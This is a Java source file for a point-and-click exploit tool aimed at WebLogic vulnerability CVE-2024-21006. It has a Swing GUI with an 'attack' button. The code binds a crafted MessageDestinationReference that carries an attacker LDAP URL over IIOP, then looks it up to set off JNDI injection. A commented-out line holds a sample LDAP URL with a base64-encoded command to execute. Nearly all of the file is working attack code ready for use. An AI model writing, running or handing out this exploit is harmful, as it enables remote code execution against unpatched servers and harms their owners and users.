package com.example.test;

import weblogic.j2ee.descriptor.InjectionTargetBean;
import weblogic.j2ee.descriptor.MessageDestinationRefBean;

import javax.naming.*;
import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Hashtable;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.security.SecureRandom;

public class Test {
    private static final String CHAR_POOL = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    private static final int LENGTH = 8;
    public static String generateRandomString(int length) {
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(length);

        for (int i = 0; i < length; i++) {
            int index = random.nextInt(CHAR_POOL.length());
            sb.append(CHAR_POOL.charAt(index));
        }

        return sb.toString();
    }
    public static void send(String ip,String port,String payload) throws Exception {

//        String rmiurl = "ldap://192.168.0.103/cVLtcNoHML/Plain/Exec/eyJjbWQiOiJ0b3VjaCAvdG1wL3N1Y2Nlc3MxMjMifQ==";
        String rhost = String.format("iiop://%s:%s", ip, port);

        Hashtable<String, String> env = new Hashtable<String, String>();
        // add wlsserver/server/lib/weblogic.jar to classpath,else will error.
        env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
        env.put(Context.PROVIDER_URL, rhost);
        Context context = new InitialContext(env);
        String randomString = generateRandomString(LENGTH);
//        Reference reference = new Reference("weblogic.application.naming.MessageDestinationObjectFactory","weblogic.application.naming.MessageDestinationObjectFactory","");
        weblogic.application.naming.MessageDestinationReference messageDestinationReference=new weblogic.application.naming.MessageDestinationReference(null, new MessageDestinationRefBean() {
            @Override
            public String[] getDescriptions() {
                return new String[0];
            }

            @Override
            public void addDescription(String s) {

            }

            @Override
            public void removeDescription(String s) {

            }

            @Override
            public void setDescriptions(String[] strings) {

            }

            @Override
            public String getMessageDestinationRefName() {
                return null;
            }

            @Override
            public void setMessageDestinationRefName(String s) {

            }

            @Override
            public String getMessageDestinationType() {
                return "weblogic.application.naming.MessageDestinationReference";
            }

            @Override
            public void setMessageDestinationType(String s) {

            }

            @Override
            public String getMessageDestinationUsage() {
                return null;
            }

            @Override
            public void setMessageDestinationUsage(String s) {

            }

            @Override
            public String getMessageDestinationLink() {
                return null;
            }

            @Override
            public void setMessageDestinationLink(String s) {

            }

            @Override
            public String getMappedName() {
                return null;
            }

            @Override
            public void setMappedName(String s) {

            }

            @Override
            public InjectionTargetBean[] getInjectionTargets() {
                return new InjectionTargetBean[0];
            }

            @Override
            public InjectionTargetBean createInjectionTarget() {
                return null;
            }

            @Override
            public void destroyInjectionTarget(InjectionTargetBean injectionTargetBean) {

            }

            @Override
            public String getLookupName() {
                return null;
            }

            @Override
            public void setLookupName(String s) {

            }

            @Override
            public String getId() {
                return null;
            }

            @Override
            public void setId(String s) {

            }
        }, payload, null, null);

        context.bind(randomString,messageDestinationReference);
        context.lookup(randomString);
    }
    public static void main(String[] args) {
        // 创建一个 JFrame 实例
        JFrame frame = new JFrame("CVE-2024-21006");
        frame.setSize(400, 300);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // 创建一个 JPanel 实例
        JPanel panel = new JPanel();
        frame.add(panel);
        placeComponents(panel);

        // 设置框架可见
        frame.setVisible(true);
    }

    private static void placeComponents(JPanel panel) {
        panel.setLayout(null);

        // 创建一个标签
        JLabel urlLabel = new JLabel("url:");
        urlLabel.setBounds(10, 20, 80, 25);
        panel.add(urlLabel);

        // 创建一个文本域用于用户输入
        JTextField urlText = new JTextField(20);
        urlText.setBounds(50, 20, 280, 25);
        urlText.setText("http://127.0.0.1:7001");
        panel.add(urlText);

        // 创建一个标签
        JLabel ldapLabel = new JLabel("ldap:");
        ldapLabel.setBounds(10, 60, 80, 25);
        panel.add(ldapLabel);

        // 创建一个文本域用于用户输入
        JTextField ldapText = new JTextField(20);
        ldapText.setBounds(50, 60, 280, 25);
        ldapText.setText("ldap://127.0.0.1:1389/test");
        panel.add(ldapText);


        // 创建一个按钮
        JButton loginButton = new JButton("attack");
        loginButton.setBounds(10, 90, 80, 25);
        panel.add(loginButton);
        JLabel message1Label = new JLabel("目标版本要求jdk<=1.8.191");
        message1Label.setBounds(10, 110, 300, 25);
        panel.add(message1Label);
        JLabel message2Label = new JLabel("by:yuday");
        message2Label.setBounds(240, 240, 100, 25);
        panel.add(message2Label);
        // 创建一个标签显示消息
        JLabel messageLabel = new JLabel("");
        messageLabel.setBounds(10, 200, 300, 25);
        panel.add(messageLabel);

        // 添加按钮点击事件
        loginButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String regex = "https?://([\\d.]+):(\\d+)/?";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(urlText.getText());

                if (matcher.find()) {
                    String ip = matcher.group(1);
                    String port = matcher.group(2);
                    try {
                        send(ip,port,ldapText.getText());
                    } catch (Exception ex) {
                        messageLabel.setText("请检查是否有ldap请求！");
                        ex.printStackTrace();
                    }
                } else {
                    System.out.println("No match found in URL: " + urlText.getText());
                }



//
            }
        });
    }
}